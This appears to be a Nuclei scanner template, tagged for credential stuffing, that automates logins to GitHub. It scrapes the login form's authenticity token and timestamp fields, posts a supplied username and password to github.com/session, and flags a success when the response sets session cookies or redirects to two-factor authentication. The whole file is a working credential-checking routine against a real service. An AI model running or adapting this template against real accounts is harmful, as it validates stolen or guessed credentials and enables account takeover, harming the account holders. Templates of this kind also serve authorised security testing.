http:
- extractors:
  - attribute: value
    internal: true
    name: authenticity_token
    part: body
    type: xpath
    xpath:
    - /html/body/div[3]/main/div/div[4]/form/input[1]
  - attribute: value
    internal: true
    name: timestamp
    part: body
    type: xpath
    xpath:
    - /html/body/div[3]/main/div/div[4]/form/div/input[10]
  - attribute: value
    internal: true
    name: timestamp_secret
    part: body
    type: xpath
    xpath:
    - /html/body/div[3]/main/div/div[4]/form/div/input[11]
  - dsl:
    - username
    - password
    type: dsl
  matchers:
  - condition: and
    dsl:
    - contains(location, 'https://github.com/sessions/two-factor')
    - status_code==302
    name: 2fa
    type: dsl
  - condition: and
    dsl:
    - 'contains(to_lower(header), ''set-cookie: logged_in=yes'')'
    - 'contains(to_lower(header), ''set-cookie: user_session='')'
    - status_code==302
    type: dsl
  matchers-condition: or
  raw:
  - 'GET https://github.com/login HTTP/1.1

    Host: github.com

    '
  - 'POST https://github.com/session HTTP/1.1

    Host: github.com

    Origin: https://github.com

    Content-Type: application/x-www-form-urlencoded

    Referer: https://github.com/login


    commit=Sign+in&authenticity_token={{authenticity_token}}&login={{username}}&password={{password}}&trusted_device=&webauthn-support=supported&webauthn-iuvpaa-support=unsupported&return_to=https%3A%2F%2Fgithub.com%2Flogin&allow_signup=&client_id=&integration=&required_field_34b7=&timestamp={{timestamp}}&timestamp_secret={{timestamp_secret}}

    '
id: github-login-check
info:
  author: parthmalhotra,pdresearch
  description: Checks for a valid github account.
  metadata:
    max-request: 2
  name: Github Login Check
  reference:
  - https://owasp.org/www-community/attacks/Credential_stuffing
  severity: critical
  tags: cloud,creds-stuffing,login-check,github
self-contained: true
